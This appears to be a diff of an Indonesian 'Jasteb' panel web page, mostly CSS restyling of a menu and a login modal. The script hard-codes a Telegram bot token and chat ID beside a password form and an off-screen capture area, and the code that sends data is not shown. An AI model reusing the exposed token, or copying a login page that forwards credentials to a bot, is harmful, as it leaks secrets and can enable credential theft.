@@ -1,169 +1,195 @@
-<!DOCTYPE html><html lang="id">
+<!DOCTYPE html>
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Web Panel Jasteb Faanzy</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
     * {
       box-sizing: border-box;
-      font-family: 'Segoe UI', sans-serif;
-    }body {
-  margin: 0;
-  padding: 0;
-  background: url('https://files.catbox.moe/5bpqir.jpg') no-repeat center center fixed;
-  background-size: cover;
-  height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
+      font-family: 'Poppins', sans-serif;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to right, #2b5876, #4e4376);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 16px;
+    }
 
-.menu-container {
-  background: rgba(255, 255, 255, 0.95);
-  padding: 30px;
-  border-radius: 16px;
-  box-shadow: 0 12px 24px rgba(0, 0, 0, 0.2);
-  width: 90%;
-  max-width: 500px;
-  text-align: center;
-}
+    .menu-container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 50px 40px;
+      border-radius: 25px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 600px;
+      text-align: center;
+      animation: fadeIn 0.6s ease-out;
+    }
 
-.menu-container h2 {
-  margin-bottom: 20px;
-  color: #2c3e50;
-}
+    .menu-container h2 {
+      margin-bottom: 30px;
+      font-size: 28px;
+      color: #34495e;
+      font-weight: 600;
+      opacity: 0;
+      animation: fadeInText 0.6s ease-out forwards 0.2s;
+    }
 
-#menu-buttons {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-  gap: 15px;
-}
+    #menu-buttons {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 20px;
+    }
 
-.menu-container button {
-  padding: 12px;
-  font-size: 16px;
-  font-weight: 600;
-  border: none;
-  border-radius: 10px;
-  color: #fff;
-  background: #3498db;
-  transition: transform 0.2s, background 0.3s;
-  cursor: pointer;
-}
+    .menu-container button {
+      padding: 16px;
+      font-size: 18px;
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      color: white;
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+      transition: transform 0.3s ease, box-shadow 0.3s ease, background 0.4s ease;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.2);
+    }
 
-.menu-container button:hover {
-  transform: translateY(-3px);
-  background: #2980b9;
-}
+    .menu-container button:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+      background: linear-gradient(135deg, #2575fc 0%, #6a11cb 100%);
+    }
 
-.notification {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  padding: 12px 18px;
-  border-radius: 8px;
-  font-weight: bold;
-  z-index: 100;
-  opacity: 0.95;
-}
+    .modal {
+      background: #fff;
+      padding: 35px;
+      border-radius: 18px;
+      width: 90%;
+      max-width: 380px;
+      text-align: center;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.15);
+      animation: fadeInModal 0.5s ease-in-out;
+    }
 
-.notification.success { background: #d4edda; color: #155724; }
-.notification.error { background: #f8d7da; color: #721c24; }
+    .modal h3 {
+      margin-bottom: 25px;
+      color: #2c3e50;
+      font-size: 24px;
+      font-weight: 600;
+    }
 
-.modal-overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.6);
-  display: none;
-  justify-content: center;
-  align-items: center;
-  z-index: 99;
-}
+    .modal input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 18px;
+      border-radius: 12px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
 
-.modal {
-  background: white;
-  padding: 25px 30px;
-  border-radius: 14px;
-  width: 90%;
-  max-width: 320px;
-  text-align: center;
-  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-  animation: fadeIn 0.3s ease-in-out;
-}
+    .modal input:focus {
+      border-color: #6a11cb;
+      outline: none;
+    }
 
-.modal h3 {
-  margin-bottom: 15px;
-  color: #34495e;
-}
+    .modal button {
+      width: 100%;
+      padding: 14px;
+      background: #27ae60;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.2s ease;
+    }
 
-.modal input {
-  width: 100%;
-  padding: 12px;
-  margin-bottom: 12px;
-  border-radius: 8px;
-  border: 1px solid #ccc;
-}
+    .modal button:hover {
+      background: #219150;
+      transform: translateY(-4px);
+    }
 
-.modal button {
-  width: 100%;
-  padding: 10px;
-  background: #2ecc71;
-  color: white;
-  font-weight: bold;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-}
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
 
-.modal button:hover {
-  background: #27ae60;
-}
+    @keyframes fadeInText {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
 
-@keyframes fadeIn {
-  from { opacity: 0; transform: scale(0.95); }
-  to { opacity: 1; transform: scale(1); }
-}
+    @keyframes fadeInModal {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
-#captureArea {
-  position: absolute;
-  left: -9999px;
-  width: 400px;
-  padding: 20px;
-  font-size: 14px;
-  background: white;
-  border-radius: 10px;
-  box-shadow: 0 0 10px rgba(0,0,0,0.3);
-}
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 14px 20px;
+      border-radius: 10px;
+      font-weight: bold;
+      z-index: 100;
+      opacity: 0.95;
+      animation: fadeInNotif 0.5s ease-out;
+    }
 
-#captureArea img {
-  width: 80px;
-  margin-bottom: 10px;
-}
+    .notification.success { background: #d4edda; color: #155724; }
+    .notification.error { background: #f8d7da; color: #721c24; }
 
-@media (max-width: 400px) {
-  .menu-container h2 {
-    font-size: 18px;
-  }
-}
+    @keyframes fadeInNotif {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
 
+    @media (max-width: 768px) {
+      .menu-container h2 {
+        font-size: 22px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .menu-container h2 {
+        font-size: 20px;
+      }
+      .menu-container button {
+        font-size: 14px;
+      }
+    }
   </style>
 </head>
 <body>
   <div class="menu-container" id="menu-container">
     <h2>Pilih Panel Jasteb Anda</h2>
     <div id="menu-buttons"></div>
-  </div>  <div class="modal-overlay" id="loginModal">
+  </div>  
+
+  <div class="modal-overlay" id="loginModal">
     <div class="modal">
       <h3>Login Panel</h3>
       <input type="text" id="usernameInput" placeholder="Username">
       <input type="password" id="passwordInput" placeholder="Password">
       <button onclick="handleLogin()">Masuk</button>
     </div>
-  </div>  <div id="captureArea">
+  </div>
+
+  <div id="captureArea">
     <img src="https://your-logo-link-here.com/logo.png" alt="Logo"/>
     <div id="reportText"></div>
-  </div>  <script>
+  </div>
+
+  <script>
     const telegramBotToken = '7847987165:AAExaFfM8F2eWgJc_0TG8k3xx3uiQKAOZxE';
     const telegramChatId = '7274253936';
 
@@ -261,5 +287,6 @@
       btn.onclick = () => showLoginModal(menu);
       menuButtons.appendChild(btn);
     });
-  </script></body>
+  </script>
+</body>
 </html>
